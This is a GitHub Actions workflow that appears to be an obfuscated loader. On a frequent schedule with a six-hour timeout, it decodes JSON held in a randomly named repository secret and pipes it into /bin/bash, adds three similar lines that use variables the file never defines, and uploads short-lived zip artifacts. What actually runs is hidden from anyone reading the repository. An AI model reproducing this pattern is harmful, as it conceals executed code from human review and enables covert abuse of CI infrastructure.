name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '47 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          lvp2344: ${{ secrets.lvp2344 }}
        run: |
          printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
          printf '%s' "$a94638" | jq -r .s4 | /bin/bash
          echo $iv5 | jq -r .yxl2 | /bin/bash
          printf '%s' "$dxhes5" | jq -r .bj192 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: mSgnlTfi
          path: "*.zip"
          retention-days: 1
